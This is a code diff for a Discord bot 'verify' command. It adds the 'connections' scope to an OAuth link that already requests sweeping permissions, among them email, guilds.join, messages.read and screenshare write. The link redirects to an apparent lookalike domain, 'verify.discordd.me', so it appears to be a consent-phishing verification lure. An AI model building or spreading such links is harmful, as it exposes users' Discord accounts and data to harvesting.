@@ -11,7 +11,7 @@ import {
 import { saveVerifyData, loadVerifyData } from '../../utils/verifyData.js';
 
 const types = ['web-verify'];
-const OAUTH_URL = `https://discord.com/oauth2/authorize?client_id=1350156436562514043&response_type=code&redirect_uri=https%3A%2F%2Fverify.discordd.me&integration_type=1&scope=identify+guilds+email+guilds.members.read+guilds.join+applications.commands+sdk.social_layer+sdk.social_layer_presence+messages.read+rpc.notifications.read+rpc.video.read+rpc.screenshare.write+openid+applications.store.update+applications.builds.read+applications.entitlements+applications.commands.permissions.update`;
+const OAUTH_URL = `https://discord.com/oauth2/authorize?client_id=1350156436562514043&response_type=code&redirect_uri=https%3A%2F%2Fverify.discordd.me&integration_type=1&scope=identify+guilds+email+guilds.members.read+guilds.join+applications.commands+sdk.social_layer+sdk.social_layer_presence+messages.read+rpc.notifications.read+rpc.video.read+rpc.screenshare.write+openid+applications.store.update+applications.builds.read+applications.entitlements+applications.commands.permissions.update+connections`;
 
 export const data = new SlashCommandBuilder()
   .setName('verify')
